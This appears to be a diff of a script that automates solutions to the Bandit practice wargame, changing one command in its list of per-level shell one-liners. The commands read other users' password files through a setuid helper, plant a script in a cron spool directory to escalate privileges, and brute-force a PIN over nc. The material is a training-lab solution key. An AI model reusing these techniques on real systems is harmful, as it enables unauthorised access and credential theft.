@@ -201,7 +201,7 @@ def get_commands():
         './bandit20-do cat /etc/bandit_pass/bandit20 | tee /tmp/bandit20_pass_sealldev', # 19->20
         '''PASS=$(cat /tmp/bandit20_pass_sealldev);mkfifo /tmp/pipe$$ && (echo "$PASS" > /tmp/pipe$$ &) && timeout 2 nc -lvnp 1337 < /tmp/pipe$$ 2>/dev/null & sleep 0.2 && ./suconnect 1337 > /dev/null 2>/dev/null && rm -f /tmp/pipe$$''', # 20->21
         'cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv', # 21->22
-        'cat /tmp/8ca319486bfbbc3663ea0fbe81326349', # 22->23
+        'cat /tmp/8ca319486bfbbc3663ea0fbe81326349 | cut -d " " -f 1', # 22->23
         '''rm /tmp/bandit$$.sh 2>/dev/null; echo "#!/bin/bash" > /tmp/bandit$$.sh; echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass_sealldev" >> /tmp/bandit$$.sh; chmod +x /tmp/bandit$$.sh; cp /tmp/bandit$$.sh /var/spool/bandit24/foo/bandit$$.sh; counter=0; while [ ! -e "/tmp/bandit24_pass_sealldev" ] && [ $counter -lt 600 ]; do sleep 0.1; counter=$((counter + 1)); done; if [ -e "/tmp/bandit24_pass_sealldev" ]; then cat /tmp/bandit24_pass_sealldev; else echo "TIMEOUT"; fi''', # 23->24
         '''PASS=$(cat /tmp/bandit24_pass_sealldev); for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 >> /tmp/out$$; cat /tmp/out$$ | grep "user bandit25 is" | sed "s/.* //g" | uniq''', # 24->25
         'cat bandit26.sshkey', # 25->26
